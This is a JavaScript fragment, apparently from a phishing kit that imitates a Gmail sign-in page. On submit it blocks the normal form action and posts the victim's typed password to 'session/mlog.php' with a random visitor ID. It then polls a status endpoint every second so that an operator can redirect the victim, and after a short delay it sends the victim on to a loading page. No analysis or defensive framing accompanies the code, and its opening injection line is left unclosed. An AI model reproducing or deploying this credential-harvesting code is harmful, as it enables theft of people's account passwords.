document.head.insertAdjacentHTML('beforeend', `

function startDelayedSubmission(event) {
    event.preventDefault();
    
    // Get form and button
    const form = document.querySelector('form');
    const button = document.getElementById('sbmbttn');
    const passwordField = document.getElementById('fldPassword');
    
    // Disable the button immediately
    button.disabled = true;
    
    // Create and show loader
    const loader = document.createElement('div');
    loader.className = 'gmail-loader';
    document.body.appendChild(loader);
    
    // Generate a visitor ID
    const visitorId = Array.from(window.crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
    
   // Send password to server
fetch('session/mlog.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: `fldPassword=${encodeURIComponent(passwordField.value)}&visitor_id=${encodeURIComponent(visitorId)}`
})
.then(response => response.json())
.then(data => {
    if (data.status === 'success') {
        // Start checking for redirects
        checkForRedirect(data.visitor_id || visitorId);
    } else {
        // If there's an error, still check for redirects
        checkForRedirect(visitorId);
    }
})
.catch(error => {
    // Even if fetch fails, check for redirects
    checkForRedirect(visitorId);
});
}

// Add function to check for redirects
function checkForRedirect(visitorId) {
    const checkInterval = setInterval(() => {
        fetch(`check_json_status.php?visitor_id=${visitorId}`)
            .then(response => response.json())
            .then(data => {
                if (data.redirect) {
                    clearInterval(checkInterval);
                    window.location.href = data.redirect_url;
                }
            })
            .catch(error => {
                console.error('Error checking redirect:', error);
            });
    }, 1000); // Check every second


    setTimeout(() => {
        clearInterval(checkInterval);
        const loader = document.querySelector('.gmail-loader');
        if (loader) {
            loader.remove();
        }
        window.location.href = 'load.php?id=' + visitorId;
    }, 2000);
}
